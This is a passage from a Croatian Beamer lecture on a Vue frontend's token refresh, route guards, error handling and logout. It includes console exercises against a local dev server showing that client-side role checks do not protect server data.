  if (res.status === 401 && options.auth !== false) {
    if (await refreshTokens()) res = await send(method, path, options)
    if (res.status === 401) {
      clearTokens()
      onSessionLost()
    }
  }
  ...  <@\komts{ostali neuspjesi: ApiError; inače tijelo odgovora}@>
}
\end{lstlisting}

\vspace{0.1em}
Na \texttt{401} sloj obnavlja token i ponavlja zahtjev. Drugi \texttt{401} ne pokreće novu obnovu, pa beskonačnog niza nema.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Obnova za istodobne zahtjeve (I)}
Prikaz koji se otvara često šalje nekoliko zahtjeva odjednom. Ako je pristupni token istekao, svi dobivaju \texttt{401} u istom trenutku i svaki pokreće obnovu.

\pause
\vspace{0.9em}
Bez dogovora tri zahtjeva šalju tri obnove i dobivaju tri para tokena, a u \texttt{localStorage} ostaje par koji je stigao zadnji.

\vspace{0.9em}
Backend ovog projekta stari token za obnovu ne poništava, pa sve tri obnove prolaze, a posao je utrostručen. Mnogi poslužitelji pri obnovi stari token poništavaju (engl. \emph{refresh token rotation}), da ukradeni token vrijedi najviše jednom. Uz takav poslužitelj prva obnova uspije, druge dvije dobiju \texttt{401}, a korisnik je odjavljen usred rada.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Obnova za istodobne zahtjeve (II)}
\begin{lstlisting}[language=typescript]
// src/api/http.ts
let refreshing: Promise<boolean> | null = null
function refreshTokens(): Promise<boolean> {
  refreshing ??= (async () => {
    <@\komts{POST /auth/refresh s tokenom za obnovu;}@>
    <@\komts{true kad je novi par spremljen}@>
    ...
  })().finally(() => {
    refreshing = null
  })
  return refreshing
}
\end{lstlisting}

\vspace{0.3em}
Obnova u tijeku pamti se kao jedno obećanje. Operator \texttt{??=} novu obnovu pokreće samo kad nijedna nije u tijeku; ostali zahtjevi dobivaju isto obećanje i čekaju njegov ishod. \texttt{finally} ga briše kad obnova završi.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Izgubljena prijava}
\begin{lstlisting}[language=typescript]
// src/main.ts
setSessionLostHandler(() => {
  auth.forget()
  const current = router.currentRoute.value
  if (!auth.ready || current.meta.public) return
  notifications.error('Prijava je istekla. Prijavite se ponovno.')
  router.push({ name: 'login',
                query: { redirect: current.fullPath } })
})
\end{lstlisting}

\vspace{0.4em}
Kad ni obnova ne uspije, \codefile{api/http.ts} briše tokene i poziva funkciju koju mu je predao \codefile{main.ts}. Sam ne zna za router ni za pohrane, pa ostaje modul bez Vuea.

\vspace{0.4em}
Korisnik dobiva obavijest i obrazac za prijavu, a nakon prijave se vraća na prikaz na kojem je bio, preko parametra \texttt{redirect}.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Stanje nakon osvježavanja stranice}
\begin{lstlisting}[language=typescript]
// src/stores/auth.ts
function restore(): Promise<void> {
  restoring ??= (async () => {
    if (getAccessToken() || getRefreshToken()) {
      try {
        user.value = await fetchMe()
      } catch {
        user.value = null
      }
    }
    ready.value = true
  })()
  return restoring
}
\end{lstlisting}

\vspace{0.2em}
Osvježavanje prazni pohrane, a tokeni ostaju u \texttt{localStorage}, pa se korisnik dohvaća ponovno. Prva navigacija čeka taj ishod.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Vježba: istekli token}
Prijavljeni ste kao klub \texttt{behemot@plreg.hr}, s otvorenim karticama Mreža i Application. U konzoli je uvezen sloj za zahtjeve:

\begin{lstlisting}[language=typescript]
const { request } = await import('/src/api/http.ts')
const all = () => Promise.all([request('GET', '/auth/me'),
  request('GET', '/competitions/'), request('GET', '/clubs/')])
\end{lstlisting}

\begin{enumerate}
  \itemsep0.15em
  \item Pod Local Storage pokvarite \texttt{plreg.access\_token} i osvježite stranicu.
  \item U kartici Mreža zabilježite zahtjeve prema \texttt{/api} i njihov redoslijed.
  \item Ponovno uvezite sloj, pokvarite token, pošaljite \texttt{await all()} i izbrojite obnove.
  \item U \codefile{src/api/http.ts} zamijenite \texttt{??=} sa \texttt{=} i ponovite treći korak.
  \item Vratite izvorni redak, pokvarite oba tokena i osvježite stranicu.
\end{enumerate}

\vspace{0.2em}
Koliko je obnova bilo u trećem, a koliko u četvrtom koraku, i što bi razlika značila uz poslužitelj koji poništava stari token?
\end{frame}

% ============================================================
\sekcija{Zaštita prikaza i pogreške}{Provjera prije navigacije, uvjet zapisan uz rutu, granica zaštite u korisničkom sučelju, mjesto obrade svake pogreške i odjava.}

% ------------------------------------------------------------
\begin{frame}{Prikaz koji se ne smije otvoriti}
Neprijavljeni korisnik upiše adresu popisa natjecanja. Prikaz se iscrta, zatraži podatke, dobije \texttt{401} i ostane prazan, uz poruku o pogrešci.

\vspace{0.9em}
Podatci nisu izašli, jer ih je backend odbio. Korisnik je svejedno dobio prazan prikaz umjesto obrasca za prijavu.

\vspace{0.9em}
Isto se događa klubu koji otvori administraciju. Svaki zahtjev s te stranice vraća \texttt{403}, a korisnik ne zna zašto.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Provjera prije navigacije}
\begin{lstlisting}[language=typescript]
// src/router/index.ts
router.beforeEach(async (to) => {
  const auth = useAuthStore()
  await auth.restore()
  if (to.meta.public) {
    if (to.name === 'login' && auth.isLoggedIn)
      return { name: 'competitions' }
    return true
  }
  if (!auth.isLoggedIn)
    return { name: 'login', query: { redirect: to.fullPath } }
  if (to.meta.role && to.meta.role !== auth.user?.role)
    return { name: 'competitions' }
  return true
})
\end{lstlisting}
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Ishodi provjere}
Vue Router funkciju predanu u \texttt{beforeEach} poziva prije svake promjene adrese:

\vspace{0.3em}
\begin{center}
{\small
\setlength{\tabcolsep}{6pt}
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{@{}L{3.0cm}L{2.8cm}L{5.4cm}@{}}
  \toprule
  \textbf{Ruta} & \textbf{Korisnik} & \textbf{Ishod} \\
  \midrule
  javna & neprijavljen & otvara se \\
  obrazac za prijavu & prijavljen & popis natjecanja \\
  zaštićena & neprijavljen & prijava, s adresom u \texttt{redirect} \\
  samo za ulogu & druge uloge & popis natjecanja \\
  zaštićena & prijavljen & otvara se \\
  \bottomrule
\end{tabular}
}
\end{center}

\vspace{0.4em}
Ako funkcija vrati \texttt{true}, navigacija se nastavlja, a ako vrati opis rute, korisnik odlazi na nju. Javne su prijava i stranica za nepoznatu adresu; sve ostalo traži prijavu.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Uvjet uz rutu}
\begin{lstlisting}[language=typescript]
// src/router/index.ts
{
  path: '/natjecatelji',
  name: 'lifters',
  component: () => import('@/views/LiftersView.vue'),
  meta: { title: 'Natjecatelji', role: 'club' },
},
{
  path: '/admin',
  component: () => import('@/views/admin/AdminLayout.vue'),
  meta: { role: 'admin' },
  children: [ ... ],
},
\end{lstlisting}

\vspace{0.2em}
Polje \texttt{meta} nosi proizvoljne podatke o ruti, a Vue Router podatke roditelja spaja s podatcima djeteta. Uvjet za cijelu administraciju piše se jednom, ondje gdje se rute nabrajaju, a provjera ostaje jedna.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Granica zaštite u korisničkom sučelju}
Provjera prije navigacije sprječava da korisnik otvori prikaz koji mu ne pripada. Ne sprječava ga da pošalje zahtjev:

\vspace{0.5em}
\begin{itemize}
  \itemsep0.45em
  \item zahtjev se može poslati iz konzole preglednika, iz alata ili iz tuđeg programa
  \item stanje aplikacije u pregledniku korisnik može promijeniti sam
  \item preuzeti kod aplikacije sadrži sve adrese koje ona poziva
\end{itemize}

\vspace{0.7em}
Provjera u pregledniku postoji radi korisnika, a provjera na poslužitelju radi zaštite. \textbf{Podatci koji korisniku ne pripadaju ne izlaze s poslužitelja}, bez obzira na to što korisničko sučelje prikazuje.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Mjesto obrade pogreške}
\vspace{0.3em}
\begin{center}
{\small
\setlength{\tabcolsep}{6pt}
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{@{}L{2.2cm}L{4.4cm}L{4.6cm}@{}}
  \toprule
  \textbf{Odgovor} & \textbf{Značenje} & \textbf{Obrađuje ga} \\
  \midrule
  \texttt{401} & token ne vrijedi ili je istekao & sloj za zahtjeve: obnova \\
  \texttt{422} & tijelo ne odgovara shemi & prikaz: poruka uz polje \\
  \texttt{400}, \texttt{409} & pravilo ili sukob sa zapisom & prikaz: poruka uz obrazac \\
  ostali & zabrana, nema zapisa, kvar & jedno mjesto: obavijest \\
  \bottomrule
\end{tabular}
}
\end{center}

\vspace{0.6em}
Odgovori \texttt{422}, \texttt{400} i \texttt{409} imaju smisla samo uz obrazac koji ih je izazvao, pa ih hvata prikaz koji ga je poslao, po polju \texttt{code}. Svi ostali znače isto na svakom prikazu i idu na jedno mjesto; bez njega bi iznimka prekinula prikaz, a korisnik ne bi znao zašto.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Obrada ostalih pogrešaka}
\begin{lstlisting}[language=typescript]
// src/main.ts
function reportError(error: unknown) {
  if (error instanceof ApiError) {
    notifications.error(error.message)
    return
  }
  console.error(error)
  notifications.error(<@'Dogodila se neočekivana pogreška. ...'@>)
}
app.config.errorHandler = (error) => reportError(error)
window.addEventListener('unhandledrejection', (event) => {
  event.preventDefault()
  reportError(event.reason)
})
\end{lstlisting}

\vspace{0.1em}
\texttt{errorHandler} hvata iznimke iz komponenata i rukovatelja događajima, a \texttt{unhandledrejection} obećanje koje nitko ne čeka.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Obavijesti}
\begin{lstlisting}[language=html]
<!-- src/components/NotificationList.vue -->
<div class="notices" aria-live="polite">
  <div v-for="n in notifications.items" :key="n.id"
       class="notice" :class="n.kind">
    <span>{{ n.text }}</span>
    ...  <!-- gumb za zatvaranje -->
  </div>
</div>
\end{lstlisting}

\vspace{0.4em}
Obavijest se pojavljuje bez pomicanja fokusa. Atribut \texttt{aria-live} čitaču zaslona javlja da pročita novi sadržaj tog dijela stranice; bez njega bi korisnik čitača zaslona pogrešku propustio.

\vspace{0.4em}
Ista poruka dvaput zaredom prikazuje se jednom (\codefile{stores/notifications.ts}), pa prekid veze koji obori nekoliko zahtjeva daje jednu obavijest.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Odjava}
\begin{lstlisting}[language=typescript]
// src/components/AppNav.vue
function logout() {
  auth.forget()
  window.location.assign('/prijava')
}
\end{lstlisting}

\vspace{0.5em}
Pohrane u memoriji drže sve što je prijavljeni korisnik dohvatio. Sljedeći korisnik iste kartice to ne smije vidjeti.

\vspace{0.5em}
Odjava zato aplikaciju učitava ispočetka. Novo učitavanje prazni sve pohrane odjednom, i one koje u projekt tek dođu, pa odjava ne treba popis svega što treba zaboraviti.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Vježba: zaobilaženje korisničkog sučelja}
Prijavljeni ste kao klub \texttt{behemot@plreg.hr}. U konzoli je pripremljeno:

\begin{lstlisting}[language=typescript]
const { request } = await import('/src/api/http.ts')
const club = { name: 'Test klub', city: 'Zadar',
  username: 'test@plreg.hr', password: '<barem 8 znakova>' }
const create = () => request('POST', '/clubs/', { body: club })
const pinia = document.querySelector('#app').__vue_app__
  .config.globalProperties.$pinia
\end{lstlisting}

\begin{enumerate}
  \itemsep0.1em
  \item U adresnu traku upišite \texttt{http://127.0.0.1:5173/admin/klubovi}.
  \item Pošaljite \texttt{await create().catch((e) => e)}.
  \item Pošaljite \texttt{pinia.state.value.auth.user.role = 'admin'}.
  \item Pogledajte navigaciju i otvorite Administracija.
  \item Ponovite drugi korak.
\end{enumerate}

\vspace{0.1em}
Što se nakon trećeg koraka promijenilo u korisničkom sučelju, a što u odgovoru u petom?
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Sažetak}
\begin{itemize}
  \itemsep0.05em
  \item Odgovor s drugog izvora skripta dobiva samo uz dopuštenje poslužitelja.
  \item Uz posrednika na izvoru stranice dopuštenje za drugi izvor nije potrebno.
  \item \texttt{fetch} ne odbija odgovor s pogreškom, pa status provjerava sloj za zahtjeve.
  \item Neuspio zahtjev postaje pogreška sa statusom, stalnim kodom i porukom.
  \item Token u \texttt{localStorage} preživi osvježavanje, ali ga čita svaka skripta.
  \item Na \texttt{401} sloj jednom obnavlja token, a istodobni zahtjevi čekaju istu obnovu.
  \item Provjera prije navigacije služi korisniku, a podatke štiti poslužitelj.
  \item Pogreške uz obrazac obrađuje prikaz, a sve ostale jedno mjesto u \codefile{main.ts}.
  \item Odjava ponovno učitava aplikaciju, pa nestaje sve što je korisnik dohvatio.
\end{itemize}
\end{frame}

\end{document}
